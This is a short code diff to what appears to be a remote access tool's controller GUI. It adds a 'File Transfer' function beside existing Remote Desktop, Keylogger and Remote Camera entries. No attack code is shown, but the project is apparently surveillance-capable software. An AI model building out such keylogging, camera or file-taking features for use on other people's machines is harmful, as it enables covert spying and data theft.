@@ -9,6 +9,7 @@ from PyQt5.QtWidgets import QLabel, QWidget, QPushButton, QDialog, QVBoxLayout, 
 
 from Constants import PACKET_SIZE
 from RATConnection import RATClient
+from RATFunction.FileTransferUI import FileTransferUI
 from RATFunction.MessageUI import MessageUI
 from RATFunction.RATFunction import Side
 from RATFunction.RATFunctionRegistry import RATFunctionRegistry
@@ -57,6 +58,7 @@ class AdministratorControlPanel(QWidget):
         self.add_control_panel_function('Remote Desktop', 2, RemoteDesktopUI)
         self.add_control_panel_function('Keylogger', 3, MyLoggingUI)
         self.add_control_panel_function('Remote Camera', 4, RemoteCameraUI)
+        self.add_control_panel_function('File Transfer', 5, FileTransferUI)
 
         self.reconnect()
 
